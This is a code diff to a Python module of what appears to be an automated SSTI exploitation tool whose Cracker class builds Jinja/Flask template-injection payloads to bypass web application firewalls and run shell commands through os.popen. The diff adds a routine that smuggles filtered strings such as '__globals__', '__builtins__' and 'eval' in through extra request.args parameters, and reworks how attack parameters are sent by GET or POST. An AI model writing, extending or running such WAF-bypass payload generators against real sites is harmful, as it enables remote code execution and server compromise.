@@ -1,12 +1,11 @@
-"""攻击指定的路径
-
-"""
+"""攻击指定的路径"""
 
 import functools
 import logging
 import random
 import re
 import sys
+import string
 import time
 
 from collections import namedtuple
@@ -15,14 +14,21 @@ from string import ascii_lowercase
 from rich.markup import escape as rich_escape
 
 from .rules_types import TargetAndSubTargets
-from .rules_utils import find_bad_exprs
+from .rules_utils import find_bad_exprs, tree_precedence
 from .requester import HTTPRequester
 from .form import random_fill
-from .submitter import FormSubmitter, RequestSubmitter, Submitter
+from .submitter import (
+    FormSubmitter,
+    RequestSubmitter,
+    Submitter,
+    ExtraParamAndDataCustomizable,
+)
+from .pbar import pbar_manager
 from .const import (
     PythonVersion,
     AutoFix500Code,
     ATTRIBUTE,
+    ITEM,
     CHAINED_ATTRIBUTE_ITEM,
     STRING,
     CONFIG,
@@ -30,16 +36,16 @@ from .const import (
     OS_POPEN_READ,
     FLASK_CONTEXT_VAR,
 )
-from .waf_func_gen import WafFuncGen, KeywordWafFuncGen
+from .waf_func_gen import WafFuncGen, KeywordWafFuncGen, WafFunc
 from .full_payload_gen import FullPayloadGen
 from .context_vars import ContextVariableManager
 from .options import Options
 
 
 if sys.version_info >= (3, 8):
-    from typing import Union, Callable, Dict, Tuple
+    from typing import Union, Callable, Dict, Tuple, List
 else:
-    from typing_extensions import Union, Callable, Dict, Tuple, Literal
+    from typing_extensions import Union, Callable, Dict, Tuple, Literal, List
 logger = logging.getLogger("cracker")
 Result = namedtuple("Result", "full_payload_gen input_field")
 
@@ -205,8 +211,77 @@ class Cracker:
                 return True
         return False
 
+    def add_request_args(
+        self,
+        full_payload_gen: FullPayloadGen,
+        waf: WafFunc,
+        extra_values: Union[List[str], None] = None,
+    ):
+        if not isinstance(self.subm, ExtraParamAndDataCustomizable):
+            return
+        values = ["_", "__", "%", "%c"]
+        if extra_values:
+            values += extra_values
+        used_name = set()
+        assert (
+            full_payload_gen.payload_gen is not None
+        ), "you need to run full_payload_gen.do_prepare()"
+        with pbar_manager.pbar(values, "add_request_args") as values:
+            for value in values:
+                name = "".join(random.choices(string.ascii_lowercase, k=2))
+                while name in used_name and waf(name):
+                    name = "".join(random.choices(string.ascii_lowercase, k=2))
+                target = (
+                    ITEM,
+                    (ATTRIBUTE, (FLASK_CONTEXT_VAR, "request"), "args"),
+                    name,
+                )
+                result = full_payload_gen.payload_gen.generate_detailed(*target)
+                if result is None:
+                    logger.warning(
+                        "Failed generating [yellow]request.args.%s[/], continue...",
+                        rich_escape(name),
+                        extra={"markup": True, "highlighter": None},
+                    )
+                    continue
+                payload, context_vars, tree = result
+                if context_vars != {}:
+                    # if it need other variables to works
+                    # like request[var1][var2]
+                    # we just skip it bacause its too complex
+                    logger.warning(
+                        "[blue]%s[/]depends on too many variables, continue",
+                        rich_escape(payload),
+                        extra={"markup": True, "highlighter": None},
+                    )
+                    continue
+
+                value_payload = full_payload_gen.payload_gen.generate(STRING, value)
+                if value_payload is not None and len(value_payload) < len(payload):
+                    # We skip it if the payload of the value is shorter than
+                    # the payload for request.args.xxx
+                    logger.warning(
+                        "[blue]%s[/]depends is too long, continue",
+                        rich_escape(payload),
+                        extra={"markup": True, "highlighter": None},
+                    )
+                    continue
+
+                precedence_index = tree_precedence(tree)
+                assert (
+                    precedence_index is not None
+                ), f"failed to calculate precedence for {payload=}"
+                logger.info(
+                    "Adding [blue]%s=[/][yellow bold]%s[/]",
+                    rich_escape(payload),
+                    rich_escape(value),
+                    extra={"markup": True, "highlighter": None},
+                )
+                self.subm.set_extra_param(name, value)
+                full_payload_gen.add_request_args(payload, value, precedence_index)
+
     def crack_with_waf(
-        self, waf_func, waf_expr_func=None
+        self, waf_func: WafFunc, waf_expr_func=None
     ) -> Union[Tuple[FullPayloadGen, bool, str, TargetAndSubTargets], None]:
         """实际进行Crack的函数
 
@@ -220,6 +295,10 @@ class Cracker:
             options=self.options,
             waf_expr_func=waf_expr_func,
         )
+        full_payload_gen.do_prepare()
+        assert full_payload_gen.payload_gen is not None
+        self.add_request_args(full_payload_gen, waf=waf_func)
+        full_payload_gen.payload_gen.cache_by_repr.clear()
         result = full_payload_gen.generate_with_tree(OS_POPEN_READ, self.test_cmd)
         if result is None:
             return None
@@ -358,6 +437,17 @@ class Cracker:
         ), "Currently onlu FormSubmitter is supported"
         waf_func = self.waf_func_gen.generate()
         full_payload_gen = FullPayloadGen(waf_func, callback=None, options=self.options)
+        full_payload_gen.do_prepare()
+        assert full_payload_gen.payload_gen is not None
+        self.add_request_args(
+            full_payload_gen, waf_func, extra_values=[
+                "__globals__",
+                "__builtins__",
+                "values",
+                "eval",
+            ]
+        )
+        full_payload_gen.payload_gen.cache_by_repr.clear()
         payload, will_print = full_payload_gen.generate(
             EVAL,
             (
@@ -375,12 +465,19 @@ class Cracker:
         assert isinstance(method, str)
         payload_param = random_fill(self.subm.form)
         payload_param.update(payload_dict)
+        params = self.subm.extra_params.copy()
+        data = {}
+        if method in ["GET", "HEAD"]:
+            params.update(payload_param)
+        else:
+            data.update(payload_param)
+
         new_subm = RequestSubmitter(
             url=self.subm.url,
             method=method,
             target_field=args_target_field,
-            params=payload_param if method == "GET" else {},
-            data=payload_param if method != "GET" else {},
+            params=params,
+            data=data,
             requester=self.subm.req,
         )
         if self.subm.tamperers:
